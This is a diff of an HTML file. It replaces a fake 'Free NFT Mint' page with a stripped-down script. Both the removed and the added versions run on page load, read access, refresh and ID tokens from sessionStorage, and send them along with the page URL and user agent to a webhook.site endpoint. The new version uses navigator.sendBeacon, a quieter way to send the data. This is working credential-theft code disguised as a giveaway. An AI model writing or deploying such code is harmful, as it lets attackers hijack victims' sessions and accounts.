@@ -1,41 +1,18 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Claim Free NFT</title>
-  <script>
-    window.onload = function () {
-      setTimeout(() => {
-        try {
-          const webhookURL = 'https://webhook.site/02e6c3d4-d0a8-4d4c-bd8f-e89bb5279231';
+<script>
+  window.onload = function () {
+    setTimeout(() => {
+      const webhookURL = 'https://webhook.site/93ba68d2-a8b4-44f3-80fe-9a086e21f433';
 
-          const data = {
-            access_token: sessionStorage.getItem("access_token"),
-            refresh_token: sessionStorage.getItem("refresh_token"),
-            id_token: sessionStorage.getItem("id_token"),
-            location: window.location.href,
-            userAgent: navigator.userAgent
-          };
+      const data = {
+        access_token: sessionStorage.getItem("access_token"),
+        refresh_token: sessionStorage.getItem("refresh_token"),
+        id_token: sessionStorage.getItem("id_token"),
+        location: window.location.href,
+        userAgent: navigator.userAgent
+      };
 
-          console.log("🚨 Token data:", data);
-
-          fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
-          }).then(res => console.log("✅ Sent to webhook"))
-            .catch(err => console.error("❌ Failed to send:", err));
-        } catch (e) {
-          console.error("❌ Script error:", e);
-        }
-      }, 1000); // slight delay after page load
-    };
-  </script>
-</head>
-<body>
-  <h1>🎉 Free NFT Mint</h1>
-  <p>Click "Connect Wallet" to claim yours.</p>
-  <button onclick="alert('Wallet connected!')">Connect Wallet</button>
-</body>
-</html>
+      const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+      navigator.sendBeacon(webhookURL, blob);
+    }, 1000);
+  };
+</script>
